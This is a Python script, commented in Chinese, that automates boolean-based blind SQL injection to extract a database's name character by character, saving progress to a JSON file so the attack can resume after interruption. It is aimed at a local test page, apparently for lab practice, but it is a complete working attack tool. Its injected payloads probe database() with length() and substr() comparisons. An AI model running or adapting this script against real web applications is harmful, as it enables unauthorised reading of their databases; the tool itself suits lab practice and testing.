"""
布尔盲注爆破数据库名 - 带断点续传功能
适用环境：本地 SQL-Injection.php 测试页面
判断依据：页面返回内容包含 "User:" 表示条件为真
"""

import string
import requests
import sys
import json
import os

# 配置
TARGET_URL = "http://localhost/SQL-Injection.php"
TIMEOUT = 5
MAX_LENGTH = 20
SAVE_FILE = "progress_dbname.json"   # 进度保存文件

# 字符集
CHARSET = string.digits + string.ascii_letters + '_'

def make_request(payload):
    try:
        params = {'id': payload}
        resp = requests.get(TARGET_URL, params=params, timeout=TIMEOUT)
        return resp.text
    except requests.RequestException:
        return None

def is_true(html):
    return html is not None and "User:" in html

def get_database_length():
    """爆破长度（无续传需求，一般较快）"""
    print("[*] 正在爆破数据库长度...")
    for length in range(1, MAX_LENGTH + 1):
        payload = f"1' and length(database())={length} -- -"
        if is_true(make_request(payload)):
            print(f"[+] 数据库长度: {length}")
            return length
    print("[-] 未找到数据库长度")
    sys.exit(1)

def load_progress():
    """加载已爆破的进度"""
    if os.path.exists(SAVE_FILE):
        with open(SAVE_FILE, 'r') as f:
            data = json.load(f)
            return data.get('db_name', ''), data.get('pos', 1)
    return '', 1

def save_progress(db_name, pos):
    """保存当前进度"""
    with open(SAVE_FILE, 'w') as f:
        json.dump({'db_name': db_name, 'pos': pos}, f)

def main():
    print("=" * 50)
    print("布尔盲注 - 数据库名爆破 (带断点续传)")
    print("=" * 50)

    # 先获取长度（如果之前已爆破过长度，可以也保存，但这里简化）
    length = get_database_length()

    # 加载已爆破的进度
    db_name, start_pos = load_progress()
    if db_name:
        print(f"[*] 检测到上次进度: 已爆破 {len(db_name)} 位: {db_name}")
    else:
        start_pos = 1

    # 从 start_pos 开始继续爆破
    for pos in range(start_pos, length + 1):
        found = False
        for ch in CHARSET:
            payload = f"1' and substr(database(),{pos},1)='{ch}' -- -"
            if is_true(make_request(payload)):
                db_name += ch
                print(f"[+] 第 {pos} 位: {ch}")
                save_progress(db_name, pos + 1)  # 保存进度，下一次从下一位开始
                found = True
                break
        if not found:
            print(f"[-] 第 {pos} 位未找到，置为 '?'")
            db_name += '?'
            save_progress(db_name, pos + 1)

    print("\n" + "=" * 50)
    print(f"[最终结果] 数据库名: {db_name}")
    print("=" * 50)
    # 删除进度文件（可选）
    if os.path.exists(SAVE_FILE):
        os.remove(SAVE_FILE)
        print("[*] 进度文件已清除")